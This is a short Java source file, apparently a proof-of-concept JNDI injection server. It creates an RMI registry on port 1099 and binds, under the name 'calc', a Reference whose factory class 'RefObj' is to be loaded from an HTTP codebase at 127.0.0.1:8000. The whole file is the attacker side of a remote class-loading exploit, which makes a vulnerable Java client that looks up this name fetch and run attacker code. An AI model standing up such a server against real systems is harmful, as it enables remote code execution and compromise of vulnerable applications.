import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.jndi.rmi.registry.RegistryContext;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.PrivilegedAction;

public class JNDIServer_RMIRef {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {

        Registry registry = LocateRegistry.createRegistry(1099);
        //绑定引用对象
        Reference refObj = new Reference("RefObj", "RefObj", "http://127.0.0.1:8000/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("calc", refObjWrapper);

    }
}
